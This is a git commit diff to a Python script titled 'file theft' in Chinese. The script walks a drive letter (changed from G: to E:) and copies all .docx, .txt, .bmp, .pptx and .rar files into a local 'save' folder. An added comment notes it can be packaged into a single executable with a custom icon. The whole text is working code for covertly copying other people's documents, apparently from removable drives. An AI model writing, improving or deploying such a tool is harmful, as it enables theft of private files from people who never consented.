0e3c984ccacd24fe7411e862cb884d7c3f404c1c
帅成马 <90511611+13768494@users.noreply.github.com>
2025-07-04 14:39:48 +0800

    Update 文件盗取.py

--- 文件盗取.py
+++ 文件盗取.py
@@ -1,3 +1,4 @@
+# 可使用pyinstaller -F -i 打包
 import os
 from win32 import *
 from win32api import GetLogicalDriveStrings
@@ -8,12 +9,16 @@ U = GetLogicalDriveStrings()
 U_list = U.split('\x00')
 U_list.pop(-1)
 
+path = ".\\save\\"
+if not os.path.exists(path):
+    os.makedirs(path)
+
 count = 0
-for root,ds,fs in os.walk("G:\\"):  # 指定盘符
+for root,ds,fs in os.walk("E:\\"):
     for files in tqdm(fs):
-        if files.lower().endswith((".docx",".txt",".bmp",".pptx",".rar")):  # 指定文件类型
+        if files.lower().endswith((".docx",".bmp",".pptx",".rar",".txt")):
             file_path = root + "\\" + files
-            save_path = "F:\\……\\" + files
+            save_path = path + files
             CopyFile(file_path, save_path ,False)
             count += 1
             print(file_path)
